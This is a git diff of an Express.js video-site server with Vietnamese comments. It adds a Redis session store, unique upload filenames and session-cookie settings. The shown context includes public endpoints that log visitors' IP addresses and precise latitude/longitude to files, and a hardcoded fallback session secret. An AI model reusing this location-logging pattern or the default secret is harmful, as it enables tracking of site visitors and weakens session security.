@@ -9,6 +9,8 @@ import { fileURLToPath } from "url";
 import dotenv from "dotenv";
 import multer from "multer";
 import session from "express-session";
+import RedisStore from "connect-redis";
+import { createClient } from "redis";
 
 // --- Cấu hình Biến môi trường ---
 dotenv.config();
@@ -18,6 +20,16 @@ const __dirname = path.dirname(__filename);
 const app = express();
 const PORT = process.env.PORT || 3000;
 const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD;
+
+// --- Cấu hình Redis Client ---
+const redisClient = createClient();
+redisClient.connect().catch(console.error);
+
+// --- Cấu hình Redis Store cho Session ---
+const redisStore = new RedisStore({
+  client: redisClient,
+  prefix: "myapp-session:", // Giúp phân biệt session của các app khác nhau nếu dùng chung Redis
+});
 
 // --- Cấu hình Multer để lưu file upload ---
 const storage = multer.diskStorage({
@@ -31,7 +43,9 @@ const storage = multer.diskStorage({
       .catch((err) => cb(err));
   },
   filename: function (req, file, cb) {
-    cb(null, file.originalname);
+    // Tạo tên file độc nhất để tránh ghi đè
+    const uniqueSuffix = Date.now() + "-" + Math.round(Math.random() * 1e9);
+    cb(null, uniqueSuffix + path.extname(file.originalname));
   },
 });
 const upload = multer({ storage: storage });
@@ -42,17 +56,19 @@ const upload = multer({ storage: storage });
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// --- Cấu hình Session (Bản cập nhật an toàn và linh hoạt) ---
+// --- Cấu hình Session với Redis ---
 app.use(
   session({
+    store: redisStore, // Sử dụng Redis để lưu trữ
     secret:
       process.env.SESSION_SECRET || "mot-chuoi-bi-mat-rat-an-toan-mac-dinh",
     resave: false,
-    saveUninitialized: true,
+    saveUninitialized: false,
     cookie: {
       secure: process.env.NODE_ENV === "production", // Chỉ bật secure mode khi chạy thật (HTTPS)
       httpOnly: true, // Ngăn JavaScript phía client truy cập cookie
       sameSite: "lax", // Biện pháp chống tấn công CSRF
+      maxAge: 1000 * 60 * 60 * 24 * 7, // Session tồn tại trong 7 ngày
     },
   })
 );
@@ -62,18 +78,17 @@ app.use(express.static(path.join(__dirname, "public")));
 // --- Middleware kiểm tra đăng nhập ---
 const requireLogin = (req, res, next) => {
   if (req.session.isLoggedIn) {
-    return next();
+    return next(); // Đã đăng nhập, cho phép đi tiếp
   }
 
+  // Nếu chưa đăng nhập và là API request, trả về lỗi JSON
   if (req.path.startsWith("/api/")) {
     return res
       .status(401)
-      .json({
-        message:
-          "Phiên đăng nhập đã hết hạn. Vui lòng tải lại trang để đăng nhập lại.",
-      });
+      .json({ message: "Phiên đăng nhập đã hết hạn. Vui lòng tải lại trang." });
   }
 
+  // Nếu là trang thông thường, chuyển hướng về trang login
   res.redirect("/admin");
 };
 
@@ -81,6 +96,7 @@ const requireLogin = (req, res, next) => {
 // PHẦN 3: CÁC API CÔNG KHAI (DÀNH CHO NGƯỜI DÙNG)
 // ==========================================================
 
+// API ghi log vị trí ước tính dựa trên IP
 app.post("/api/log-ip-location", async (req, res) => {
   const userIP = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
   const timestamp = new Date().toLocaleString("vi-VN", {
@@ -104,10 +120,12 @@ app.post("/api/log-ip-location", async (req, res) => {
     await fs.appendFile("ip_logs.txt", `\n${locationInfo}\n`, "utf8");
     res.status(200).json({ message: "IP location log attempted" });
   } catch (fileError) {
+    console.error("Error writing IP log:", fileError);
     res.status(500).json({ message: "Failed to write to log file" });
   }
 });
 
+// API ghi log vị trí chính xác
 app.post("/api/log-precise-location", async (req, res) => {
   try {
     const { latitude, longitude } = req.body;
@@ -130,6 +148,7 @@ app.post("/api/log-precise-location", async (req, res) => {
   }
 });
 
+// API lấy video đang được kích hoạt để hiển thị trên trang chủ
 app.get("/api/active-video", async (req, res) => {
   const configPath = path.join(__dirname, "data", "config.json");
   try {
@@ -162,6 +181,7 @@ app.post("/admin/login", (req, res) => {
   }
 });
 
+// Áp dụng middleware requireLogin cho các route cần bảo vệ
 app.get("/admin/dashboard", requireLogin, (req, res) => {
   res.sendFile(path.join(__dirname, "public", "dashboard.html"));
 });
@@ -235,6 +255,7 @@ app.post(
     }
     res.status(200).json({
       message: `File '${req.file.filename}' đã được upload thành công.`,
+      filePath: `/videos/${req.file.filename}`,
     });
   }
 );
@@ -306,7 +327,7 @@ app.listen(PORT, () => {
   console.log(`Server đang chạy tại http://localhost:${PORT}`);
   if (!ADMIN_PASSWORD) {
     console.warn(
-      "CẢNH BÁO: Biến môi trường ADMIN_PASSWORD chưa được thiết lập trong file .env!"
+      "CẢNH BÁO: ADMIN_PASSWORD chưa được thiết lập trong file .env!"
     );
   }
 });
